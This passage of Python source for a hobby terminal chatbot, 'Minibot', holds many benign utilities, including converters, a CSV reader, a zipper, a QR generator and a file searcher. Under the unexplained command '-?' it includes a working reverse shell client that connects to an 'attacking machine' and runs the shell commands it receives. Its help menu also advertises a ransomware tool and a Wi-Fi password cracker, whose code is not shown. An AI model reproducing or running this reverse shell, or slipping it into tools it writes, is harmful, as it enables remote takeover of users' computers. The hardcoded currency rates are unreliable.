                        {"game": "The Evil Within", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Dead Space Remake", "platform": "PC, PS5, Xbox Series X/S", "system": "High-end"},
                        {"game": "Outlast 2", "platform": "PC, PS4, Xbox One", "system": "Low-end"},
                        {"game": "Silent Hill 4: The Room", "platform": "PC, PS2", "system": "Low-end"}
                    ]
                }

                # Platforms
                platforms = ["PC", "PS4", "Xbox One", "Switch", "PS5", "Xbox Series X/S"]

                # User input
                print("---------------------------")
                print("Choose a category of game:")
                for idx, category in enumerate(categories.keys(), 1):
                    print(f"{idx}. {category}")

                print("---------------------------------")
                category_choice = int(input("Choose Catgory (1/2/3/4/5/6/7/8): "))
                category = list(categories.keys())[category_choice - 1]

                print("---------------------------------")
                print("\nChoose a platform:")
                for idx, platform in enumerate(platforms, 1):
                    print(f"{idx}. {platform}")

                print("-------------------------------")
                platform_choice = int(input("Choose Platform(1/2/3/4/5/6): "))
                platform = platforms[platform_choice - 1]

                print("-------------------------------")
                print("\nChoose system performance:")
                print("1. High-end")
                print("2. Mid-end")
                print("3. Low-end")

                print("--------------------------------")
                system_choice = int(input("Choose System Performance(1/2/3): "))
                if system_choice == 1:
                    system_performance = "High-end"
                elif system_choice == 2:
                    system_performance = "Mid-end"
                else:
                    system_performance = "Low-end"

                matching_games = [game for game in categories[category] if platform in game["platform"] and (game["system"] == system_performance or system_performance == "Mid-end")]

                if matching_games:
                    chosen_game = random.choice(matching_games)
                    print(f"\nWe recommend: {chosen_game['game']} for {chosen_game['platform']} ({chosen_game['system']} system)")
                    return "I hope you will enjoy it"
                else:
                    print("\nSorry, no games found matching your criteria.")
                
            suggest_game()
            print("-----------------------------------------")
            return "I hope you will enjoy this game!"

    elif "-ucr" in ui:
            def unit_converter():
                print("-------- UNIT CONVERTER ---------")
                print("1. Length")
                print("2. Weight")
                print("3. Time")
                print("4. Exit")
                print("---------------------------------")

                while True:
                    choice = input("Choose an option (1/2/3/4): ")

                    if choice == "1":  # Length Conversion
                        print("\nLength Conversion:")
                        print("1. Meters to Kilometers")
                        print("2. Kilometers to Meters")
                        print("3. Meters to Centimeters")
                        print("4. Centimeters to Meters")
                        print("5. Kilometers to Miles")
                        print("6. Miles to Kilometers")
                        print("7. Exit")
                        sub_choice = input("Choose an option (1/2/3/4/5/6/7): ")
                        
                        if sub_choice == "1":
                            meters = float(input("Enter meters: "))
                            print(f"{meters} meters = {meters / 1000} kilometers")
                        elif sub_choice == "2":
                            kilometers = float(input("Enter kilometers: "))
                            print(f"{kilometers} kilometers = {kilometers * 1000} meters")
                        elif sub_choice == "3":
                            meters = float(input("Enter meters: "))
                            print(f"{meters} meters = {meters * 100} centimeters")
                        elif sub_choice == "4":
                            centimeters = float(input("Enter centimeters: "))
                            print(f"{centimeters} centimeters = {centimeters / 100} meters")
                        elif sub_choice == "5":
                            kilometers = float(input("Enter kilometers: "))
                            print(f"{kilometers} kilometers = {kilometers * 0.621371} miles")
                        elif sub_choice == "6":
                            miles = float(input("Enter miles: "))
                            print(f"{miles} miles = {miles / 0.621371} kilometers")
                        elif sub_choice == "7":
                            print("Exited.")
                            break
                        else:
                            print("Invalid choice!")

                    elif choice == "2":  # Weight Conversion
                        print("\nWeight Conversion:")
                        print("1. Kilograms to Pounds")
                        print("2. Pounds to Kilograms")
                        print("3. Grams to Kilograms")
                        print("4. Kilograms to Grams")
                        print("5. Exit")
                        sub_choice = input("Choose an option (1/2/3/4/5): ")
                        print("-----------------------------------")
                        if sub_choice == "1":
                            kg = float(input("Enter kilograms: "))
                            print(f"{kg} kg = {kg * 2.20462} pounds")
                        elif sub_choice == "2":
                            pounds = float(input("Enter pounds: "))
                            print(f"{pounds} pounds = {pounds / 2.20462} kilograms")
                        elif sub_choice == "3":
                            grams = float(input("Enter grams: "))
                            print(f"{grams} grams = {grams / 1000} kilograms")
                        elif sub_choice == "4":
                            kg = float(input("Enter kilograms: "))
                            print(f"{kg} kilograms = {kg * 1000} grams")
                        elif sub_choice == "5":
                            print("Exited.")
                            break
                        else:
                            print("Invalid choice!")

                    elif choice == "3":  # Time Conversion
                        print("\nTime Conversion:")
                        print("1. Minutes to Hours")
                        print("2. Hours to Minutes")
                        print("3. Seconds to Minutes")
                        print("4. Minutes to Seconds")
                        print("5. Exit")
                        sub_choice = input("Choose an option (1/2/3/4/5): ")
                        
                        if sub_choice == "1":
                            minutes = float(input("Enter minutes: "))
                            print(f"{minutes} minutes = {minutes / 60} hours")
                        elif sub_choice == "2":
                            hours = float(input("Enter hours: "))
                            print(f"{hours} hours = {hours * 60} minutes")
                        elif sub_choice == "3":
                            seconds = float(input("Enter seconds: "))
                            print(f"{seconds} seconds = {seconds / 60} minutes")
                        elif sub_choice == "4":
                            minutes = float(input("Enter minutes: "))
                            print(f"{minutes} minutes = {minutes * 60} seconds")
                        elif sub_choice == "5":
                            print("Exited.")
                            break
                        else:
                            print("Invalid choice!")

                    elif choice == "4":  # Exit
                        print("Exiting Unit Converter. Goodbye!")
                        break

                    else:
                        print("Invalid choice! Please select a valid option.")

                    print("----------------------------------")

            # Run the function
            unit_converter()
            return "Thanks for using Unit Converter!"

    elif "-cry" in ui: #usd to inr convertor
            def convert(usd, to_currency):
                conversion_rates = {
                    "INR": 84,       # Indian Rupee
                    "EUR": 0.94,     # Euro
                    "GBP": 0.76,     # British Pound
                    "JPY": 132.50,   # Japanese Yen
                    "AUD": 1.45,     # Australian Dollar
                    "CAD": 1.36,     # Canadian Dollar
                    "CNY": 6.95,     # Chinese Yuan
                    "CHF": 0.91,     # Swiss Franc
                    "NZD": 1.60,     # New Zealand Dollar
                    "SGD": 1.34,     # Singapore Dollar
                    "MXN": 17.85,    # Mexican Peso
                    "ZAR": 18.20,    # South African Rand
                    "RUB": 96.25,    # Russian Ruble
                    "AED": 3.67,     # UAE Dirham
                    "BRL": 5.30,     # Brazilian Real
                    "SAR": 3.75,     # Saudi Riyal
                }
                
                if to_currency in conversion_rates:
                    converted_amount = usd * conversion_rates[to_currency]
                    print(f"{usd} USD is equal to {converted_amount:.2f} {to_currency}")
                else:
                    print("Invalid currency code! Please choose a valid currency code.")

            print("----------------------------")
            print("Available currencies:")
            print("INR: Indian Rupee")
            print("EUR: Euro")
            print("GBP: British Pound")
            print("JPY: Japanese Yen")
            print("AUD: Australian Dollar")
            print("CAD: Canadian Dollar")
            print("CNY: Chinese Yuan")
            print("CHF: Swiss Franc")
            print("NZD: New Zealand Dollar")
            print("SGD: Singapore Dollar")
            print("MXN: Mexican Peso")
            print("ZAR: South African Rand")
            print("RUB: Russian Ruble")
            print("AED: UAE Dirham")
            print("BRL: Brazilian Real")
            print("SAR: Saudi Riyal")
            print("----------------------------")

            usd = int(input("Enter value (in USD): "))
            to_currency = input("Convert to (currency code): ").upper()
            print("----------------------------")
            convert(usd, to_currency)
            return "Done!"
    
    elif "-csv" in ui:
            import csv
            def read_csv(file_name):
                try:
                    print(f"Attempting to read file: {file_name}")  # Debug print
                    with open(file_name, mode='r', newline='', encoding='utf-8') as file:
                        reader = csv.reader(file)
                        header = next(reader)
                        data = [header]  # Include header as the first row
                        for row in reader:
                            data.append(row)
                        
                        # Calculate column widths based on the data
                        column_widths = [max(len(str(item)) for item in col) for col in zip(*data)]
                        
                        # Print header
                        print("Header:", header)
                        print("Column Widths:", column_widths)  # Debugging column widths
                        
                        total_width = sum(column_widths) + 3 * (len(header) - 1)
                        print("-" * total_width)  # Print separator line
                        for row in data:
                            print(" | ".join(f"{item:{column_widths[i]}}" for i, item in enumerate(row)))
                        
                except FileNotFoundError:
                    print(f"Error: The file '{file_name}' was not found.")
                except Exception as e:
                    print(f"An error occurred: {e}")

            def get_file_name():
                while True:
                    file_name = input("Enter the name of the CSV file (with extension): ")
                    if file_name:
                        return file_name
                    else:
                        print("Please provide a valid file name.")

            if __name__ == "__main__":
                file_name = get_file_name()
                read_csv(file_name)

    # Learning functionality
    elif "-zip" in ui:  #Zipper
        import os
        try: 
            import pyzipper

            def zip_file_or_folder(input_path, output_zip, password=None):
                try:
                    # Open the ZIP file in write mode with encryption support
                    with pyzipper.AESZipFile(output_zip, 'w', compression=pyzipper.ZIP_DEFLATED) as zipf:
                        if password:  # If a password is provided
                            zipf.setpassword(password.encode())  # Set password for encryption
                            zipf.setencryption(pyzipper.WZ_AES)  # Set AES encryption

                        # Check if input is a file or a folder
                        if os.path.isfile(input_path):
                            # If it's a file, just add it
                            zipf.write(input_path, os.path.basename(input_path))
                        elif os.path.isdir(input_path):
                            # If it's a directory, walk through the folder and add all files
                            for foldername, subfolders, filenames in os.walk(input_path):
                                for filename in filenames:
                                    file_path = os.path.join(foldername, filename)
                                    zipf.write(file_path, os.path.relpath(file_path, input_path))
                        else:
                            print("Input path is neither a file nor a directory.")
                            return("Zipping Failed!")

                    print(f"Files/Folder '{input_path}' have been compressed and saved as '{output_zip}'.")
                except Exception as e:
                    print(f"An error occurred: {e}")

            # Example usage
            input_path = input("Enter File/Folder Path: ").strip()  # Provide the file or folder path
            if not input_path:
                print("File/Folder path cannot be empty.")
            else:
                output_zip = input("Enter Zip File Name (e.g., /path/to/MyFileisNow.zip): ").strip()  # Output zip file name
                if not output_zip.endswith(".zip"):
                    output_zip += ".zip"  # Automatically append .zip if not provided

                password = input("Enter Password For Zip File (Optional): ").strip()  # Optional password
                if not password:
                    password = None  # Treat empty input as no password

                zip_file_or_folder(input_path, output_zip, password)
        
        except ImportError:
            return "You need to install 'pyzipper' library to use this! please install it by using 'pip install pyzipper' or 'pip3 install pyzipper'."
        return "Thanks for using Zipper Tool!"
    
    elif "motivate me" in ui or "can you motivate me" in ui or "please motivate me" in ui: #motivte quotes
        import random
        quotes = [
            "The only way to do great work is to love what you do. If you haven't found it yet, keep looking. Don't settle. - Steve Jobs",
            "The best time to plant a tree was 20 years ago. The second best time is now. - Chinese Proverb",
            "Your limitation—it's only your imagination.",
            "Push yourself, because no one else is going to do it for you.",
            "Great things never come from comfort zones.",
            "Dream it. Wish it. Do it.",
            "Success doesn't just find you. You have to go out and get it.",
        ]
        print(random.choice(quotes))
    elif "-ust" in ui: #url shortener
        try: 
            import pyshorteners
            # Take the long URL input
            UI = input("Enter the long link: ")

            # Initialize the shortener
            s = pyshorteners.Shortener()

            # Shorten the URL
            shortened_url = s.tinyurl.short(UI)

            # Print the shortened URL
            return(f"\nYour shortened link: {shortened_url}")
        except ImportError:
            return "You need to install 'pyshortener' library to use this. use 'pip install pyshorteners' or 'pip3 install pyshorteners'"
    
    elif "-sw" in ui: #stopwatch
        import time
        import sys
        import os

        def is_data_available():
            """Checks if there's data available to be read from stdin."""
            if os.name == 'nt':  # Windows
                import msvcrt
                return msvcrt.kbhit()
            else:  # macOS, Linux
                import select
                return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])

        def get_char():
            """Gets a single character from stdin without echoing it."""
            if os.name == 'nt':  # Windows
                import msvcrt
                return msvcrt.getch().decode()  # Decode from bytes to string
            else:  # macOS, Linux
                import tty
                import termios
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                try:
                    tty.setraw(sys.stdin.fileno())
                    ch = sys.stdin.read(1)
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                return ch

        def live_stopwatch():
            print("Press Enter to start the stopwatch.\nPress any other key to stop.")
            input()  # Wait for Enter to start

            start_time = time.time()
            stopped = False

            try:
                while not stopped:
                    elapsed_time = time.time() - start_time
                    sys.stdout.write(f"Elapsed time: {elapsed_time:.2f} seconds\r")
                    sys.stdout.flush()
                    time.sleep(0.01)

                    if is_data_available():
                        get_char()  # Consume the key press
                        stopped = True
            except KeyboardInterrupt:
                pass  # Handle Ctrl+C as well
            finally:
                print("\nStopwatch stopped.")
                elapsed_time = time.time() - start_time
                print(f"Final elapsed time: {elapsed_time:.2f} seconds")

        if __name__ == "__main__":
            live_stopwatch()
            return "Stopwatch Stopped!"
    elif "-lfm" in ui:  # Learn new response
        print("\033[34mMinibot\033[0m: Learning mode activated. Type the question and its response. Type '-exit' to stop teaching me.")
        while True:
            question = input("\033[34mMinibot\033[0m: (Question) — e.g., 'what is my name?': ").lower().strip()
            if question == '-exit':
                print("\033[34mMinibot\033[0m: Exiting learning mode.")
                break
            response = input("\033[34mMinibot\033[0m: (Response) — e.g., 'Your name is Chad!': ").strip()
            learn_response(question, response, memory)
            print("\033[34mMinibot\033[0m: Response learned.")
        return "Thanks for Teaching Me, I Will Remember That!"
    elif "-qrg" in ui:
        try:
            import qrcode
            qr = qrcode.QRCode(
                    version=1,
                    error_correction=qrcode.constants.ERROR_CORRECT_L,
                    box_size=10,
                    border=4,
                )
            print("--- QRCODE GENERATER ---")
            site = input("Enter the URL to encode: ")
            qr.add_data(site)
            qr.make(fit=True)
            # site input moved above qr.add_data()
            img = qr.make_image(fill='black', back_color='white')
            qrfile_name = input("Enter the name of the QR code file to save (e.g., qr1.png): ")
            img.save(qrfile_name)
            return(f"QR code generated and saved as '{qrfile_name}'.")
            #return "QR Code generated Successfully!"
        except ImportError:
            return("You need to install 'qrcode' to generate QR codes. Use 'pip install qrcode' or 'pip3 install qrcode'")

    elif "-fst" in ui:
        import os
        import time
        print("---- FILE SEARCHER TOOL ----")
        def search_files(directory, file_name=None, file_extension=None, date_range=None):
            """
            Search for files in a given directory with optional filters:
            - file_name: string (partial name match)
            - file_extension: string (e.g. '.txt', '.jpg')
            - date_range: tuple (start_date, end_date) in UNIX timestamp format
            
            Returns a list of matching file paths.
            """
            matching_files = []

            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)

                    # Check file name filter (partial match)
                    if file_name and file_name.lower() not in file.lower():
                        continue

                    # Check file extension filter
                    if file_extension and not file.lower().endswith(file_extension.lower()):
                        continue

                    # Check date range filter (created date)
                    if date_range:
                        file_creation_time = os.path.getctime(file_path)
                        if not (date_range[0] <= file_creation_time <= date_range[1]):
                            continue

                    # If all filters pass, add the file path to the results
                    matching_files.append(file_path)
            
            return matching_files

        def display_files(files):
            """Display the list of found files."""
            if files:
                print("\nFound the following files:")
                for file in files:
                    print(file)
            else:
                print("\nNo files found with the given criteria.")

        def main():
            # Input directory to search
            directory = input("Enter the directory to search in: ")
            
            if not os.path.isdir(directory):
                print("Invalid directory.")
                return
            
            # Input filters
            file_name = input("Enter part of the file name to search (leave empty for no filter): ")
            file_extension = input("Enter the file extension to search (e.g. '.txt', leave empty for no filter): ")
            
            date_filter_input = input("Do you want to filter by creation date? (yes/no): ").lower()
            date_range = None
            
            if date_filter_input == 'yes':
                start_date_input = input("Enter start date (YYYY-MM-DD): ")
                end_date_input = input("Enter end date (YYYY-MM-DD): ")

                # Convert to UNIX timestamp
                try:
                    start_timestamp = int(time.mktime(time.strptime(start_date_input, "%Y-%m-%d")))
                    end_timestamp = int(time.mktime(time.strptime(end_date_input, "%Y-%m-%d")))
                    date_range = (start_timestamp, end_timestamp)
                except ValueError:
                    print("Invalid date format. Please use YYYY-MM-DD.")
                    return
            
            # Perform the search
            found_files = search_files(directory, file_name, file_extension, date_range)
            
            # Display the results
            display_files(found_files)

        if __name__ == "__main__":
            main()
        return "Thanks for using File Searcher Tool!"
    
    elif "-?" in ui:
        # Simple reverse shell client
        print("---- MINI REVERSE SHELL ----")
        import socket
        import os
        import subprocess
        import sys

        # Simple reverse shell client with error handling
        def reverse_shell():
            try:
                # Prompt user for IP and port
                server_ip = input("Enter the IP address of the attacking machine: ")
                server_port = int(input("Enter the port number of the attacking machine: "))

                # Validate IP and port input
                try:
                    socket.inet_aton(server_ip)  # Check if the IP is valid
                except socket.error:
                    print("Invalid IP address!")
                    sys.exit(1)
                
                if server_port < 1 or server_port > 65535:
                    print("Invalid port number. It should be between 1 and 65535.")
                    sys.exit(1)

                # Connect to the attacking machine
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.connect((server_ip, server_port))
                    print(f"Connected to {server_ip}:{server_port}")
                except socket.error as e:
                    print(f"Failed to connect to {server_ip}:{server_port}. Error: {e}")
                    sys.exit(1)

                while True:
                    try:
                        # Receive the command from the attacker
                        command = s.recv(1024).decode()

                        if command.lower() == '-exit':
                            print("Closing connection...")
                            break

                        # Execute the command and send back the result
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)

                        # Check for errors in command execution
                        if output.returncode != 0:
                            s.send(f"Error executing command: {output.stderr}".encode())
                        else:
                            s.send(output.stdout.encode())
                    except Exception as e:
                        print(f"An error occurred while processing the command: {e}")
                        s.send(f"Error: {str(e)}".encode())

                s.close()

            except KeyboardInterrupt:
                print("\nConnection interrupted by user.")
                sys.exit(0)

        if __name__ == "__main__":
            reverse_shell()

    #*********************************************************
    #*********************************************************
    #*********************************************************
    #*********************************************************
    #*********************************************************
    #*****************HELP ME CODE****************************
    elif "-helpme" in ui or "-hm" in ui: 
        #return "All Commands: \n01. -hm for help me commands\n02. -wipe for cleaning the terminal\n03. -lfm for larn from me (Minibot can learn from you) \n04. -vr for version \n05. -abt for about chatbot \n06. -fdb for feedback \n07.-mt for multiplication table\n08. -psc for password strength checker\n09. -calc for calculator\n10. -dga for digits analyzer \n11. -uc for unit converter\n12. -cft for C/F temperature converter\n13. -mq for maths quiz\n14. -cry for currency converter\n15. -trv for trivia quiz\n16. -rps for rock paper scissor game\n17. -mag for mini adventure game\n18. -lgg for language guesser game\n19. -hgm for hangman\n20. -ms for movie suggestion\n21. -vgs for video games suggestion\n22. -pg for password generator\n23. -fpg for fake profile generator\n24. -qte for quote\n25. -msc for music suggestion\n26. -fct for random facts\n27. -wotd for word of the day\n28. -rid for riddles\n29. -jk for jokes\n30. -mkt for creating txt file\n31. -fo for files organizer\n32. -adb for address book\n33. -age for birth age calculator\n34. -crp for code crypto (dynamic)\n35. -sch for daily schedule maker\n36. -pft for personal finance tracker\n37. -wfc for word frequency counter\n38. -url for URL bookmark manager\n39. -wpc for wifi password cracker\n40. -ctz for countries time zone\n41. -tmdt for time and date viewer\n42. -cln for calendar\n43. -e2hc for English to Hindi/Chinese translator\n44. -plt for Python language test\n45. -tst for typing speed test\n46. -pnt for personality test \n47. -bmi for bmi checker \n48. -vr for \033[34mMinibot\033[0m version \n45. -exit for exiting the \033[34mMinibot\033[0m \n46. -fdb for feedback \n47. -sinf for system information \n48. -lpm for local password manager\n49. -tdl for to do list\n50. -lfm for learn from me (\033[34mMinibot\033[0m can learn from you)\n51. -abt for about chatbot \n52. -mkd for making directory/folder \n53. -txr for txt reader \n54. -dsv for directory and files stats viewer \n55. -mpy for mini python code compiler \n56. -mls for mini linux simulation commands (e.g., cat, nano, rm, ls etc.) \n57. -bkp for backing up folder/file \n58. -pcta for password crack time analyzer \n59. -brt for brain train \n60. -wyr for would you rather \n61. -sw for stopwatch \n62. -ip for your ip lookup (of course it needs internet) \n63. -smd for social media posts/reels/video download (also need internet) \n64. -pdf for pdf tool \n65. -rmw for ransomware tool (don't use for bad purpose!) \n66. -stg for steganography \n67. -ust for url shortener (need internet) \n68. -zmg for mini zombie game \n69. -mp3 for music player \n70. -fst for file searcher tool \n71. -qrg for qr code generater \n72. -srp for web scraper (require internet) \n73. -lws for local web server \n74. -csv for csv reader \n75. -dwf for special dark web facts \n76. -? (check this out!)"
        return """All Commands:
- General Commands -
01. -hm for help me commands  
02. -wipe for cleaning the terminal  
03. -lfm for learn from me (Minibot can learn from you)  
04. -vr for version  
05. -abt for about chatbot  
06. -fdb for feedback  
07. -exit for exiting the Minibot  

- Educational & Utility Tools -
08. -mt for multiplication table  
09. -psc for password strength checker  
10. -calc for calculator  
11. -dga for digits analyzer  
12. -ucr for unit converter  
13. -cft for C/F temperature converter  
14. -plt for Python language test  
15. -tst for typing speed test   
16. -bmi for BMI checker  
17. -e2hc for English to Hindi/Chinese translator

- Fun & Games -
18. -mq for maths quiz  
19. -trv for trivia quiz  
20. -rps for rock paper scissor game  
21. -mag for mini adventure game  
22. -lgg for language guesser game  
23. -hgm for hangman  
24. -zmg for mini zombie game  
25. -brt for brain train  
26. -wyr for would you rather
27. -pnt for personality test   

- Entertainment -
28. -ms for movie suggestion  
29. -vgs for video games suggestion  
30. -msc for music suggestion  
31. -qte for quote  
32. -fct for random facts  
33. -wotd for word of the day  
34. -rid for riddles  
35. -jk for jokes  

- File Management & System Tools -
36. -mkt for creating txt file  
37. -fo for files organizer  
38. -adb for address book  
39. -txr for txt reader  
40. -dsv for directory and files stats viewer  
41. -mkd for making directory/folder  
42. -bkp for backing up folder/file  
43. -fst for file searcher tool  
44. -lpm for local password manager 
45. -inf for system information 
46. -wfc for word frequency counter  

- Internet & Advanced Tools -
47. -ip for your IP lookup (requires internet)  
48. -smd for social media posts/reels/video download (requires internet)  
49. -ust for URL shortener (requires internet)  
50. -web for web scraper (requires internet)  
51. -lws for local web server  
52. -dwf for special dark web facts  
53. -url for URL bookmark manager
54. -img for image scraper (requires internet)
55. -imc for image compressor

- Time-Related Tools -
56. -age for birth age calculator  
57. -tmdt for time and date viewer  
58. -cln for calendar  
59. -sw for stopwatch  
60. -ctz for countries time zone  
61. -tfc for time format converter
62. -rem for reminder

- Encryption & Special Tools -
63. -zip for zipping files
64. -stg for steganography  
65. -pct for password crack time analyzer  
66. -crp for code crypto (dynamic)  
67. -qrg for QR code generator  
68. -? (check this out!)  
69. -fpg for fake profile generator
70. -wpc for Wi-Fi password cracker
71. -pg for password generator

- Media & Player Tools -
72. -pdf for PDF tool  
73. -mp3 for music player  
74. -csv for CSV reader  

- Financial & Productivity Tools -
75. -cry for currency converter  
76. -sch for daily schedule maker  
77. -pft for personal finance tracker  
78. -tdl for to-do list  

- Mini Simulations Tools -
79. -mls for mini Linux simulation commands (e.g., cat, nano, rm, ls, etc.)  
80. -mpy for mini Python code compiler  
        """
    #*********************************************************
    #*********************************************************
    #*********************************************************
    #*********************************************************
    #*********************************************************
    #*********************************************************

    elif "-imc" in ui: #image compressor
        try:
            from PIL import Image
            def reduce_image_size(input_path, output_path, max_width, max_height, quality=85):
                """
                Reduces the size of an image by resizing it to fit within max_width and max_height.

                Parameters:
                    input_path (str): Path to the input image.
                    output_path (str): Path to save the reduced image.
                    max_width (int): Maximum width of the resized image.
                    max_height (int): Maximum height of the resized image.
                    quality (int): Image quality for saving (1-100).
                """
                try:
                    with Image.open(input_path) as img:
                        # Get original dimensions
                        original_width, original_height = img.size

                        # Calculate the new dimensions while maintaining aspect ratio
                        aspect_ratio = original_width / original_height
                        if original_width > max_width or original_height > max_height:
                            if aspect_ratio > 1:
                                # Landscape orientation
                                new_width = max_width
                                new_height = int(max_width / aspect_ratio)
                            else:
                                # Portrait orientation
                                new_height = max_height
                                new_width = int(max_height * aspect_ratio)
                        else:
                            # Image is already smaller than max dimensions
                            new_width, new_height = original_width, original_height

                        # Resize the image
                        resized_img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)

                        # Save the resized image
                        resized_img.save(output_path, quality=quality)
                        print(f"Image saved to {output_path} with dimensions {new_width}x{new_height}.")

                except Exception as e:
                    print(f"Error reducing image size: {e}")

            # Example usage
            input_file = input("Enter Image Path: ") # Replace with your input file
            output_file = input("Enter Output Path: ")# Replace with your desired output file
            reduce_image_size(input_file, output_file, max_width=800, max_height=800, quality=85)
            return "Image Compression Done!"
        except ImportError:
            return("You need to install 'pillow' library to use Image Size Compressor, use 'pip install pillow' or 'pip3 install pillow' to install.")

    elif "-e2hc" in ui:
        # Dictionary for translations
        translations_dict = {
            "hello": {
                "Chinese (Simplified)": "你好 (nǐ hǎo)",
                "Hindi": "नमस्ते (namaste)"
            },
            "food": {
                "Chinese (Simplified)": "食物 (shí wù)",
                "Hindi": "खाना (khaana)"
            },
            "bat": {
                "Chinese (Simplified)": "蝙蝠 (biān fú)",
                "Hindi": "चमगादड़ (Chamgādaṛ)"
            },
            "language": {
                "Chinese (Simplified)": "语言 (yǔ yán)",
                "Hindi": "भाषा (bhāṣā)"
            },
            "apple": {
                "Chinese (Simplified)": "苹果 (píng guǒ)",
                "Hindi": "सेब (seb)"
            },
            "banana": {
                "Chinese (Simplified)": "香蕉 (xiāng jiāo)",
                "Hindi": "केला (kelā)"
            },
            "orange": {
                "Chinese (Simplified)": "橙子 (chéng zi)",
                "Hindi": "संतरा (santrā)"
            },
            "grape": {
                "Chinese (Simplified)": "葡萄 (pú táo)",
                "Hindi": "अंगूर (angūr)"
            },
            "mango": {
                "Chinese (Simplified)": "芒果 (máng guǒ)",
                "Hindi": "आम (ām)"
            },
            "pineapple": {
                "Chinese (Simplified)": "菠萝 (bō luó)",
                "Hindi": "अनानास (anānās)"
            },
            "watermelon": {
                "Chinese (Simplified)": "西瓜 (xī guā)",
                "Hindi": "तरबूज (tarbūz)"
            },
            "peach": {
                "Chinese (Simplified)": "桃子 (táo zi)",
                "Hindi": "आड़ू (āḍū)"
            },
            "strawberry": {
                "Chinese (Simplified)": "草莓 (cǎo méi)",
                "Hindi": "स्ट्रॉबेरी (strawberry)"
            },
            "kiwi": {
                "Chinese (Simplified)": "奇异果 (qí yì guǒ)",
                "Hindi": "कीवी (kīvī)"
            },
            "cherry": {
                "Chinese (Simplified)": "樱桃 (yīng táo)",
                "Hindi": "चेरी (cherī)"
            },
            "pear": {
                "Chinese (Simplified)": "梨 (lí)",
                "Hindi": "नाशपाती (nāśpātī)"
            },
            "apricot": {
                "Chinese (Simplified)": "杏子 (xìng zi)",
                "Hindi": "खुबानी (khubānī)"
            },
            "pomegranate": {
                "Chinese (Simplified)": "石榴 (shí liú)",
                "Hindi": "अनार (anār)"
            },
            "plum": {
                "Chinese (Simplified)": "李子 (lǐ zi)",
                "Hindi": "आलूबुखारा (ālūbukhārā)"
            },
            "lemon": {
                "Chinese (Simplified)": "柠檬 (níng méng)",
                "Hindi": "नींबू (nīmbū)"
            },
            "coconut": {
                "Chinese (Simplified)": "椰子 (yē zi)",
                "Hindi": "नारियल (nāriyāl)"
            },
            "papaya": {
                "Chinese (Simplified)": "木瓜 (mù guā)",
                "Hindi": "पपीता (papītā)"
            },
            "fig": {
                "Chinese (Simplified)": "无花果 (wú huā guǒ)",
                "Hindi": "अंजीर (anjīr)"
            },
            "dragon fruit": {
                "Chinese (Simplified)": "火龙果 (huǒ lóng guǒ)",
                "Hindi": "ट्रेगन फ्रूट (ṭrēgan frūṭ)"
            },
            "melon": {
                "Chinese (Simplified)": "甜瓜 (tián guā)",
                "Hindi": "खरबूजा (kharbūjā)"
            },
            "guava": {
                "Chinese (Simplified)": "番石榴 (fān shí liú)",
                "Hindi": "अमरूद (amrūd)"
            },
            "red": {
                "Chinese (Simplified)": "红色 (hóng sè)",
                "Hindi": "लाल (lāl)"
            },
            "blue": {
                "Chinese (Simplified)": "蓝色 (lán sè)",
                "Hindi": "नीला (nīlā)"
            },
            "green": {
                "Chinese (Simplified)": "绿色 (lǜ sè)",
                "Hindi": "हरा (harā)"
            },
            "yellow": {
                "Chinese (Simplified)": "黄色 (huáng sè)",
                "Hindi": "पीला (pīlā)"
            },
            "black": {
                "Chinese (Simplified)": "黑色 (hēi sè)",
                "Hindi": "काला (kālā)"
            },
            "white": {
                "Chinese (Simplified)": "白色 (bái sè)",
                "Hindi": "सफेद (safed)"
            },
            "orange": {
                "Chinese (Simplified)": "橙色 (chéng sè)",
                "Hindi": "नारंगी (nāraṅgī)"
            },
            "purple": {
                "Chinese (Simplified)": "紫色 (zǐ sè)",
                "Hindi": "बैंगनी (bainganī)"
            },
            "pink": {
                "Chinese (Simplified)": "粉红色 (fěn hóng sè)",
                "Hindi": "गुलाबी (gulābī)"
            },
            "brown": {
                "Chinese (Simplified)": "棕色 (zōng sè)",
                "Hindi": "भूरा (bhūrā)"
            },
            "gray": {
                "Chinese (Simplified)": "灰色 (huī sè)",
                "Hindi": "धूसर (dhūsar)"
            },
            "violet": {
                "Chinese (Simplified)": "紫罗兰色 (zǐ luó lán sè)",
                "Hindi": "बैंगनी (bainganī)"
            },
            "cyan": {
                "Chinese (Simplified)": "青色 (qīng sè)",
                "Hindi": "नस्ली (naslī)"
            },
            "indigo": {
                "Chinese (Simplified)": "靛蓝色 (diàn lán sè)",
                "Hindi": "इंडिगो (indigo)"
            },
            "beige": {
                "Chinese (Simplified)": "米色 (mǐ sè)",
                "Hindi": "बेज (bej)"
            },
            "turquoise": {
                "Chinese (Simplified)": "绿松石色 (lǜ sōng shí sè)",
                "Hindi": "फिरोजी (fīrojī)"
            },
            "teal": {
                "Chinese (Simplified)": "青绿色 (qīng lǜ sè)",
                "Hindi": "नीलापन (nīlāpan)"
            },
            "magenta": {
                "Chinese (Simplified)": "洋红色 (yáng hóng sè)",
                "Hindi": "मैजेंटा (majenṭā)"
            },
            "lavender": {
                "Chinese (Simplified)": "薰衣草色 (xūn yī cǎo sè)",
                "Hindi": "लैवेंडर (laivendar)"
            },
            "gold": {
                "Chinese (Simplified)": "金色 (jīn sè)",
                "Hindi": "सोना (sonā)"
            },
            "silver": {
                "Chinese (Simplified)": "银色 (yín sè)",
                "Hindi": "चाँदी (chāndī)"
            },
            "platinum": {
                "Chinese (Simplified)": "铂金色 (bó jīn sè)",
                "Hindi": "प्लैटिनम (platinum)"
            },
            "water": {
                "Chinese (Simplified)": "水 (shuǐ)",
                "Hindi": "पानी (paani)"
            },
            "how are you": {
                "Chinese (Simplified)": "你好吗 (nǐ hǎo ma)",
                "Hindi": "कैसे हो? (kaise ho?)"
            },
            "good night": {
                "Chinese (Simplified)": "晚安 (wǎn ān)",
                "Hindi": "शुभ रात्रि (shubh raatri)"
            },
            "carrot": {
                "Chinese (Simplified)": "胡萝卜 (hú luó bo)",
                "Hindi": "गाजर (gājar)"
            },
            "potato": {
                "Chinese (Simplified)": "土豆 (tǔ dòu)",
                "Hindi": "आलू (ālū)"
            },
